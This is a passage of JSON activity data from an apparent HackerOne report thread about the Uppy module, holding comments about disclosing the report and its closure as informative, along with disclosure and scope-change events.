GitHub?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:13:13.732Z","updated_at":"2018-02-27T22:13:13.732Z","actor":{"username":"arturi","cleared":false,"url":"/arturi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440614,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's perfectly fine to mention me and the payload demonstrated.","markdown_message":"\u003cp\u003eIt\u0026#39;s perfectly fine to mention me and the payload demonstrated.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:14:31.345Z","updated_at":"2018-02-27T22:14:31.345Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's fine by us :-)","markdown_message":"\u003cp\u003eIt\u0026#39;s fine by us :-)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:14:44.569Z","updated_at":"2018-02-27T22:14:44.569Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2440622,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you! It’s fine to resolve, just wondering if other team members will be able to view/comment once its resolved. If not, maybe you could keep this open for another day, so more interested parties get a change to look through.","markdown_message":"\u003cp\u003eThank you! It’s fine to resolve, just wondering if other team members will be able to view/comment once its resolved. If not, maybe you could keep this open for another day, so more interested parties get a change to look through.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:20:37.826Z","updated_at":"2018-02-27T22:20:37.826Z","actor":{"username":"arturi","cleared":false,"url":"/arturi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440636,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@arturi yes. once I fully disclose the report it will be reachable for anyone (no commenting though since the report will be closed).\n\nIf there won't be any additional input in the next couple of days I'll go ahead with disclosing it as an informational report.","markdown_message":"\u003cp\u003e\u003ca href=\"/arturi\"\u003e@arturi\u003c/a\u003e yes. once I fully disclose the report it will be reachable for anyone (no commenting though since the report will be closed).\u003c/p\u003e\n\n\u003cp\u003eIf there won\u0026#39;t be any additional input in the next couple of days I\u0026#39;ll go ahead with disclosing it as an informational report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:27:00.963Z","updated_at":"2018-02-27T22:27:00.963Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2441606,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-28T08:00:58.225Z","updated_at":"2018-02-28T08:00:58.225Z","actor":{"username":"kvz","cleared":false,"url":"/kvz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2447629,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"The vulnerability is not in the uppy module itself but related to internal systems the issue was discovered on and has been addressed by its maintainers.","markdown_message":"\u003cp\u003eThe vulnerability is not in the uppy module itself but related to internal systems the issue was discovered on and has been addressed by its maintainers.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-01T19:11:13.456Z","updated_at":"2018-03-01T19:11:13.456Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2447630,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-01T19:11:21.654Z","updated_at":"2018-03-01T19:11:21.654Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2447632,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-01T19:11:29.034Z","updated_at":"2018-03-01T19:11:29.034Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8557940,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-10T09:32:09.200Z","updated_at":"2020-07-10T09:32:09.200Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Other module","new_scope":"Uppy","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}